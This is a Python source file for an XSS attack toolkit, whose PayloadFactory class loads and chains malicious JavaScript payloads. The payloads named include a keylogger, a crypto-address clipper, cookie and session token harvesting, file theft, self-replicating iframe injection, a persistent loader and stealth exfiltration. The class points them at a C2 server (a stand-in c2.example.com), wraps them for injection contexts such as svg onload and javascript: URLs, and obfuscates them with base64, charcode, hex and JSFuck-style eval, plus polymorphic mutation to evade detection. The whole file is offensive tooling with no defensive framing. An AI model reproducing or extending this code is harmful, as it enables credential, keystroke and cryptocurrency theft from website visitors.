"""
factory.py - PayloadFactory

A comprehensive payload selection and deployment system.
Supports dynamic loading, chaining, multiple obfuscation methods, and context detection.
"""

import base64
import os
import re
import random
import string
from pathlib import Path
from typing import List, Optional, Union


class PayloadFactory:
    """
    Factory for generating, obfuscating, and deploying XSS payloads.
    """
    
    # Default payload directory (relative to this file)
    PAYLOAD_DIR = Path(__file__).parent.parent / "payloads"
    
    # Fallback to root exxploit dir for JS files
    ROOT_DIR = Path(__file__).parent.parent.parent
    
    # Available payloads
    PAYLOADS = {
        'evasion': 'evasion.js',
        'camouflage': 'camouflage.js',
        'keylogger': 'keylogger.js',
        'miner': 'miner.js',
        'download': 'download.js',
        'clipboard': 'clipboard.js',
        'virus': 'virus.js',
        'replicate': 'replicate.js',
        'exfil': 'exfil.js',
    }
    
    # One-line summaries for each payload
    DESCRIPTIONS = {
        'evasion': 'Zero-day detection bypass (DevTools, VM, headless)',
        'camouflage': 'Behavioral masking and action gating',
        'keylogger': 'AES-encrypted keystroke capture',
        'miner': 'Multi-coin clipper with visual spoofing (BTC/ETH/SOL/DOGE)',
        'clipboard': 'Cookie and session token harvesting',
        'download': 'File theft via internal blob exfiltration',
        'virus': 'Multi-stage loader with persistence',
        'replicate': 'Self-replicating iframe injection',
        'exfil': 'Multi-method stealth data exfiltration',
    }
    
    # Context wrappers
    CONTEXTS = {
        'html': '<svg/onload="{code}">',
        'attribute': '" onmouseover="{code}" data-x="',
        'script': '-{code}-',
        'style': 'expression({code})',
        'url': 'javascript:{code}',
        'event': '{code}',
    }
    
    def __init__(self, c2_base: str = 'https://c2.example.com', payload_dir: Optional[Path] = None):
        self.c2_base = c2_base
        if payload_dir:
            self.payload_dir = Path(payload_dir)
        elif self.PAYLOAD_DIR.exists():
            self.payload_dir = self.PAYLOAD_DIR
        else:
            self.payload_dir = self.ROOT_DIR
    
    # --- Obfuscation Methods ---
    
    def _obfuscate_base64(self, code: str) -> str:
        """Base64 + eval wrapper."""
        encoded = base64.b64encode(code.encode()).decode()
        return f"eval(atob('{encoded}'))"
    
    def _obfuscate_charcode(self, code: str) -> str:
        """String.fromCharCode obfuscation."""
        chars = ','.join(str(ord(c)) for c in code)
        return f"eval(String.fromCharCode({chars}))"
    
    def _obfuscate_jsfuck(self, code: str) -> str:
        """JSFuck-style obfuscation (simplified subset)."""
        encoded = base64.b64encode(code.encode()).decode()
        return f"[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[]+[])[(+{{}}+[])[+!+[]]]]('return atob(\"{encoded}\")')()[0]()"
    
    def _obfuscate_hex(self, code: str) -> str:
        """Hex-encoded string eval."""
        hex_str = code.encode().hex()
        pairs = [f"\\x{hex_str[i:i+2]}" for i in range(0, len(hex_str), 2)]
        return f'eval("{"".join(pairs)}")'
    
    def _obfuscate_split(self, code: str) -> str:
        """Split string and reconstruct."""
        encoded = base64.b64encode(code.encode()).decode()
        mid = len(encoded) // 2
        part1 = encoded[:mid]
        part2 = encoded[mid:]
        return f"eval(atob('{part1}'+'{part2}'))"
    
    def obfuscate(self, code: str, method: str = 'base64') -> str:
        """Apply obfuscation method to code."""
        methods = {
            'base64': self._obfuscate_base64,
            'charcode': self._obfuscate_charcode,
            'jsfuck': self._obfuscate_jsfuck,
            'hex': self._obfuscate_hex,
            'split': self._obfuscate_split,
        }
        return methods.get(method, self._obfuscate_base64)(code)
    
    # --- Payload Loading ---
    
    def load_payload(self, name: str, variables: Optional[dict] = None) -> str:
        """
        Load payload code from file and optionally inject variables.
        
        Variables are injected by replacing /*{{NAME}}*/ {...} with the actual data.
        """
        if name not in self.PAYLOADS:
            return f"console.log('Unknown payload: {name}');"
        
        filename = self.PAYLOADS[name]
        code = ""
        
        # Try payload_dir first, then root
        for base in [self.payload_dir, self.ROOT_DIR]:
            path = base / filename
            if path.exists():
                code = path.read_text()
                break
        
        if not code:
            return f"console.log('Payload file not found: {name}');"
            
        # Combine provided variables with global defaults (like C2_BASE)
        all_vars = {'C2_BASE': self.c2_base}
        if variables:
            all_vars.update(variables)
            
        # Inject variables
        import json
        for var_name, var_value in all_vars.items():
            # Match /*{{VAR}}*/ followed by optional assignment
            pattern = rf'/\*{{{{{var_name}}}}}\*/\s*([\'\"].*?[\'\"]|{{.*?}}|\[.*?\]|null|undefined)?'
            
            if isinstance(var_value, (dict, list)):
                replacement = json.dumps(var_value)
            elif isinstance(var_value, str):
                # Ensure strings are properly quoted for JS
                replacement = f"'{var_value}'" if not (var_value.startswith("'") or var_value.startswith('"')) else var_value
            else:
                replacement = str(var_value)
                
            code = re.sub(pattern, replacement, code, flags=re.DOTALL)
        
        return code
    
    def list_payloads(self) -> List[str]:
        """List all available payload names."""
        return list(self.PAYLOADS.keys())
    
    # --- Chain Building ---
    
    def build_chain(self, payloads: List[str], obfuscation: str = 'base64', variables: Optional[dict] = None) -> str:
        """
        Build a chained payload that executes multiple payloads in sequence.
        
        Args:
            payloads: List of payload names (e.g., ['evasion', 'keylogger', 'exfil'])
            obfuscation: Obfuscation method to apply
            variables: Variables to inject into payloads (e.g., {'CLIPPER_CONFIG': {...}})
        
        Returns:
            Combined and obfuscated payload string
        """
        combined = []
        for name in payloads:
            code = self.load_payload(name, variables=variables)
            # Wrap in IIFE to avoid variable conflicts
            combined.append(f"(function(){{{code}}})();")
        
        full_code = '\n'.join(combined)
        return self.obfuscate(full_code, obfuscation)

    
    # --- Context Detection ---
    
    def detect_context(self, html_snippet: str) -> str:
        """
        Auto-detect injection context from HTML snippet.
        
        Returns one of: html, attribute, script, style, url, event
        """
        snippet = html_snippet.lower()
        
        if re.search(r'<script[^>]*>.*</script>', snippet, re.DOTALL):
            return 'script'
        if re.search(r'style\s*=\s*["\']', snippet):
            return 'style'
        if re.search(r'href\s*=\s*["\']javascript:', snippet):
            return 'url'
        if re.search(r'on\w+\s*=\s*["\']', snippet):
            return 'event'
        if re.search(r'<\w+[^>]*\w+\s*=\s*["\'][^"\']*$', snippet):
            return 'attribute'
        return 'html'
    
    # --- Payload Generation ---
    
    def select_payload(
        self, 
        payload_type: Union[str, List[str]], 
        context: str = 'html', 
        obfuscation: str = 'base64'
    ) -> str:
        """
        Select and wrap a payload for the given context.
        
        Args:
            payload_type: Name of the payload or list for chaining
            context: Injection context (html, attribute, script, style, url, event)
            obfuscation: Obfuscation method
        
        Returns:
            Context-wrapped, obfuscated payload string
        """
        if isinstance(payload_type, list):
            code = self.build_chain(payload_type, obfuscation)
        else:
            raw_code = self.load_payload(payload_type)
            code = self.obfuscate(raw_code, obfuscation)
        
        wrapper = self.CONTEXTS.get(context, self.CONTEXTS['html'])
        return wrapper.format(code=code)
    
    def generate_polymorphic(self, payload_type: str, context: str = 'html') -> str:
        """
        Generate a polymorphic payload that changes on each call.
        Uses random variable names and obfuscation.
        """
        raw_code = self.load_payload(payload_type)
        
        # Random variable renaming
        var_prefix = ''.join(random.choices(string.ascii_lowercase, k=3))
        renamed = raw_code.replace('const ', f'const {var_prefix}_')
        renamed = renamed.replace('let ', f'let {var_prefix}_')
        renamed = renamed.replace('var ', f'var {var_prefix}_')
        
        # Random obfuscation method
        method = random.choice(['base64', 'charcode', 'hex', 'split'])
        obfuscated = self.obfuscate(renamed, method)
        
        # Random junk comments
        junk = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        wrapped = f'/* {junk} */ {obfuscated}'
        
        wrapper = self.CONTEXTS.get(context, self.CONTEXTS['html'])
        return wrapper.format(code=wrapped)
